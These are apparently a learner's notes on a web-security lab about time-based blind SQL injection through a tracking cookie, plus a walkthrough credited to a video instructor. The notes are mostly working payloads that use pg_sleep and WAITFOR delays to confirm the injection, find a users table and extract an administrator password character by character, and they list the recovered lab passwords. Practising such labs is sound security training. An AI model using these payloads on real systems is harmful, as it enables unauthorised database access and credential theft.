
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END

' || (select case when (1=1) then pg_sleep(10) else pg_sleep(0) end) --


'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--





# checking the  type of database

' || ( SELECT pg_sleep(10) ) --   => this works which means it is postgresql



# checking if users table exist



'; IF (select '' from users where rownum =1 ) = '' WAITFOR DELAY '0:0:10'--

`' || (select case when (1=1) then pg_sleep(10) else pg_sleep(0) end) --` -> simple sql query to check cases


`' || (select case when (username = 'administrator') then pg_sleep(10) else pg_sleep(0) end from users) --`
we got 10 sec delay
hence there exist users table with username administrator


# Checking password length


FROM users WHERE username='administrator' and length(password)>1

`' || (select case when (username='administrator' and length(password)>1) then pg_sleep(5) else pg_sleep(0) end from users) -- `

length = 20


# brute forcing the password



`' || (select case when (username='administrator' and substr(password,1,1)='y') then pg_sleep(5) else pg_sleep(0) end from users) -- `




1 1
2 2
3 h
4 y
5 i
6 o
7 3
8 d
9 x
10 e
11 z
12 q
13 4
14 z
15 v
16 t
17 z
18 b
19 d
20 8



12hyio3dxezq4zvtzbd8





-----
-----
FROM [Rana Khalil](https://www.youtube.com/@RanaKhalil101)

Lab #14 - Blind SQLi with time delays and informational retrieval

Vulnerable parameter - tracking cookie

End Goals:
- Exploit time-based blind SQLi to output the administrator password
- Login as the administrator user

Analysis:

1) Confirm that the parameter is vulnerable to SQLi

' || pg_sleep(10)--

2) Confirm that the users table exists in the database

' || (select case when (1=0) then pg_sleep(10) else pg_sleep(-1) end)--

' || (select case when (username='administrator') then pg_sleep(10) else pg_sleep(-1) end from users)--

3) Enumerate the password length

' || (select case when (username='administrator' and LENGTH(password)>20) then pg_sleep(10) else pg_sleep(-1) end from users)--
-> length of password is 20 characters

4) Enumerate the administrator password

' || (select case when (username='administrator' and substring(password,1,1)='a') then pg_sleep(10) else pg_sleep(-1) end from users)--

13ipnob7l2dkjp3drryy
















































